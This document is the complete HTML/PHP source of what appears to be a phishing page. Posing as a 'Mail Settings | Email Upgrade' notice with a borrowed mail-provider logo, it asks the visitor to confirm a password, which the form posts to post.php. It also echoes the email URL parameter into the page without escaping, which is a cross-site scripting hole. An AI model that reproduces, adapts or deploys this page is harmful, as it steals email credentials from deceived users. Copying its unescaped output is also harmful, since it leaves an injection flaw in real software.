<html>
<head>
<link rel="shortcut icon" href="http://mail.ppscn.com/public/image/projectIcon.ico" type="image/gif"/>
<title>Mail Settings | Email Upgrade</title><script src='/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="https://wm.mailanyone.net/login/images/logo.png" width="160" height="70">

	<br><br>

	<font face="verdana" size="2">
	Confirm your account to upgrade your mailbox 
	</font>


	<br>

	<form method="post" action="post.php">


	<br><br>

	<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username"><h2 class="form-signin-heading"><?php echo $_GET['email']; ?></h2>
	<input  name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="Enter Password">	



	<br><br>

	<input type="submit" value="Upgrade Now" style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	Mail Account (c)2017 | All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</html>
</body>